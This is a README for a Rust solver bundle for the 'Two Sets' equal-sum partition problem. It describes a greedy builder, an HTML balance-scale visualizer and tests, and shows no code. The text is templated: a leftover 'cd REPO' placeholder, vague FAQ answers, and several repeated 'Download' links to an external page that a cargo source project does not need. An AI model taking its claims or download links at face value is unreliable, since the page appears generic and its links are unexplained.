# Two Sets v - Script Collection 2026

> A compact Rust solver bundle for the classic two sets partition task, aimed at users who want an easy way to check equal-sum splits, review a greedy construction approach, and inspect the outcome with a balance-scale visualizer.

[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonmiller74/two-sets-problem-scripts?style=flat-square)](https://github.com/masonmiller74/two-sets-problem-scripts)

---

<p align="center">
  <a href="https://masonmiller74.github.io/two-sets-problem-scripts/">
    <img src="https://img.shields.io/badge/Download-Two%20Sets%20Scripts-brightgreen?style=for-the-badge" alt="Download Two Sets Scripts">
  </a>
</p>

> **[Direct Download - Two Sets](https://masonmiller74.github.io/two-sets-problem-scripts/)**

---

[Download Latest Build](https://masonmiller74.github.io/two-sets-problem-scripts/)

---

## Project Summary

Two Sets is a streamlined solver-focused collection built around the problem of dividing the integers from 1 through n into two groups with the same total. It is meant for fast experimentation with the standard equal-sum partition challenge, using a greedy construction that works downward from n and determines whether a valid division can be produced.

The repository also ships with an interactive HTML balance-scale visualizer, which makes it easier to trace the partition process one step at a time. Sample output and integration tests are included so you can confirm behavior, compare outcomes, and fit the workflow into a Rust and cargo environment.

## What Is Included

| Category | What it covers |
| --- | --- |
| Partition solver | Checks whether 1..n can be split into two equal-sum sets |
| Greedy builder | Constructs one partition by selecting values from n down to 1 |
| Visualizer | Interactive HTML balance-scale view of the greedy fill |
| Example output | Reference output for reviewing solver behavior |
| Integration tests | Test coverage for core partitioning logic |
| Cargo project files | Rust project setup and build workflow support |
| Documentation assets | Supporting notes and usage references |

## Getting Started

Clone the repository and compile it with cargo:

    git clone https://github.com/masonmiller74/two-sets-problem-scripts.git
    cd REPO
    cargo build

After building, run the solver or open the bundled HTML visualizer in your browser once the example output has been generated or loaded. If you want to keep the project tidy, separate solver code, visual assets, and test files into their own folders so the partition logic and presentation layer stay easy to manage.

## Compatibility

| Area | Support |
| --- | --- |
| Language | Rust |
| Build tool | cargo |
| Output format | HTML visualizer and example output |
| Problem type | Two Sets equal-sum partitioning |
| Test support | Integration tests included |

## Repository Structure

    REPO/
    ├── scripts/
    │   └── solver.rs
    ├── configs/
    │   └── cargo settings and project metadata
    ├── examples/
    │   └── sample output and usage samples
    ├── docs/
    │   └── visualizer notes and algorithm details
    ├── assets/
    │   └── balance-scale HTML resources
    └── tests/
        └── integration tests

## FAQ

**How often is it updated?**  
That depends on repository maintenance and on any changes made to the solver, the examples, or the visualizer assets.

**Can I customize the greedy partition logic?**  
Yes. The layout is well suited for changing the greedy fill order, output formatting, or the visual treatment.

**Will it work outside Rust?**  
The solver is centered on Rust and cargo, while the visualizer is provided as HTML. You can adapt the produced outputs to other workflows if necessary.

**Does it store anything locally?**  
Any local files come from what you create while building, testing, or opening the HTML visualizer. Manage generated artifacts according to your own project rules.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
